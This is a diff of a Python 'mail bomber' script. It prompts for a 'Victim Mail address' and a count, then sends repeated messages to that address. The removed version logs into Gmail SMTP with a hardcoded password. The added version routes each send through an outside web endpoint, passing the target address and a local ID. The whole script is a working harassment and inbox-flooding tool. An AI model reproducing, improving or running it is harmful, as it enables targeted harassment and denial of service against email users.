@@ -1,23 +1,10 @@
 #!/usr/bin/env python
 try:
-    from datetime import datetime
     import os
-    import hashlib
     import sys
-    import time
-    import threading
-    import string
-    import random
-    import base64
-    import urllib.request
-    import urllib.parse
+    import notify2
+    import requests 
     import subprocess
-    import webbrowser
-    import smtplib
-    import sys
-    import os
-    import subprocess
-    import json  
 except :
     print("Plase Install Require Package \nUsing 'pip install -r requirement.txt'")
 
@@ -27,15 +14,15 @@ Blue= '\033[1;36m'
 Endc = '\033[0m'
 verl = open("core/.version", 'r').read()
 
-type = 00
+typey = 00
 
 try:
         import notify2
-        type = 1
+        typey = 1
 except :
-    type = 0
+    typey = 0
 
-if type == 0 :
+if typey == 0 :
         def startM():
             pass
 else:
@@ -85,67 +72,66 @@ def banner():
 
 
 def mail():
+    ve = open("core/.da", 'r')
+    veq = ve.read()
+    id = str(veq.strip())
     b = 0
     RG = str(input("Enter Victim Mail address : "))
     num = input("Enter Number of Mail : ")
-    while num == '':
-        num = input("Please Enter Number of Mail : ")
-
-    while num.isdigit() != True:
-        num = input("\aInvalid! Please Enter Number of Mail : ")
-
     mail = int(num) + 1
     print("\n\t\tPlease Wait Bombing Start...")
-    
+
     startM()
     for i in range(1,mail):
-        with open("core/data.json") as f:
-            data = json.load(f)
-            js_fil = data['js']
-            js = js_fil[random.randrange(0,3)]
-        fil = "sdha$#ehh09" 
-        try:
-            conn = smtplib.SMTP('smtp.gmail.com',587)
-            tr = fil
-            conn.ehlo()
-            utt = tr
-            conn.starttls()
-            conn.login(js, utt)
-
-        
-            conn.sendmail("h899502@gmail.com",RG,'Subject: Hello \n\n hello ')
-            clr()
-            banner()
-            print(Blue)
-            print("-------------------------------------------- ")
-            print(Red +"                  Details "+Blue)
-            print("   Target Gmail           : ",RG)
-            print("   Number of Requests Sent : ", num)
-            print("   Successful Requests     : ", 0)
-            print("   Failed Requests         : ", i )
-            print("-------------------------------------------- ")
-            print("            Bombing In Progress")
-        except :
-            b =+ 1
-            clr()
-            banner()
-            print(Blue)
-            print("-------------------------------------------- ")
-            print(Red +"                  Details "+Blue)
-            print("   Target Gmail           : ",RG)
-            print("   Number of Requests Sent : ", num)
-            print("   Successful Requests     : ", 0)
-            print("   Failed Requests         : ", i )
-            print("-------------------------------------------- ")
-            print(" Something Wrong Please Try Again")
+            url = "https://honeypots.tech//mail/index.php?mail="+str(RG)+"&num="+str(i)+"&id="+id
+            header= {
+                'Host': 'honeypots.tech',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close',
+                'Upgrade-Insecure-Requests': '1',
+                'Cache-Control': 'max-age=0'
+            }
+            try:
+                r = requests.get(url=url, headers= header , timeout=2)
+            except:
+                pass
+            r_status = r.status_code
+            if r_status == 200 :
+                clr()
+                banner()
+                print(Blue)
+                print("-------------------------------------------- ")
+                print(Red +"                  Details "+Blue)
+                print("   Target Gmail           : ",RG)
+                print("   Number of Requests Sent : ", num)
+                print("   Successful Requests     : ", i )
+                print("   Failed Requests         : ", 0)
+                print("-------------------------------------------- ")
+                print("            Bombing In Progress")
+            else :
+                print(Blue+line,'\n')
+                print('\n\tSomething Wrong to Send Mail ..\n\n       Please Contact To Developer ')
+                print('\n\t     Error : 508\n')
+                print(line)
+                print(Red+'\n\t\t[ Sub Menu ]')
+                print(Blue +'''\n[01] Contact To Developer\n[02] Again Run HPomb Tool''')
+                error500 = input('\nChoose One Options : ')
+                if error500 == 1:
+                    subprocess.call([sys.executable, 'core/contact.py'])
+                else: 
+                    subprocess.call([sys.executable, 'hpomb.py'])        
 
 clr()
 banner()
 try:
-    urllib.request.urlopen('https://www.google.com')
-except Exception:
-    print("   You are not connected To Internet!!!")
-    print("\n  Please Connect To Internet To Continue...\n")
-    input('   Press Enter To Use Again Mail Bombing ...')
-    subprocess.call([sys.executable, 'ml.py'])
+    r = requests.get('https://www.google.com')
+except:
+        print('\n     Your Internet Connection Slow ... ')
+        print('\n\t     Error : 510\n')
+        print(line)
+        input('\n\tPress Enter To Run Again HBomb Tool: ')
+        subprocess.call([sys.executable, 'hbomb.py'])
 mail()
